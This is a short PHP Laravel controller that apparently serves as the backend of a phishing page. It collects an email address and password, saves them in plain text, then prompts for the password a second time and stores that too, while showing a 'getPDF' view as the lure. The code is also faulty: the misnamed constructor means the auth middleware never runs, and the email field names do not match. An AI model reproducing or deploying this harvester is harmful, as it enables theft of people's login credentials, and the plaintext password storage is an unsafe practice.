<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\URL;
use App\Post;

class Miscel extends Controller
{

   public function __Miscel()
   {
     
       $this->middleware("auth");  #, ["except"=>['Details.welcome', "Details.login"]]);
      session(["status"=>false]);

   }
   public function index()
   {
     
     
       return view("Details.welcome");
      return("<h1> Welcome back from dead land </h1>");

   }
public function loadlog()
{

    return view("Details.getPDF");

}

   public function insert(Request $req)
   {
     $this->validate($req, [
     'email'=>'required',
     'pass'=>'required'

     ]);
    if(session("status"))
    {
        $this->update($req, session("ID"));
        return view("Details.getPDF");

    }
 else
 {
       $mail = $req->input('mail');
       $pass = $req->input('pass');
       #$id = Post::count() + 1;
       $post = new Post();
       $post->email = $mail;
       $post->password = $pass;
       $post->dates = "Today";
       $post->cpassword ="Password";
       $post->save();
       $id = $post->id;
       session(['status'=>true, "ID"=>$id, "mail"=>$mail]);
       return view("Details.login");

      }

   #return ("Thank you for checking");

   }

   public function update(Request $req, $id)
   {
        $pass = $req->input('pass');
        $post = Post::find($id);
        $post->cpassword = $pass;
        $post->save();
        
        return view("Details.getPDF");

   }

}




?>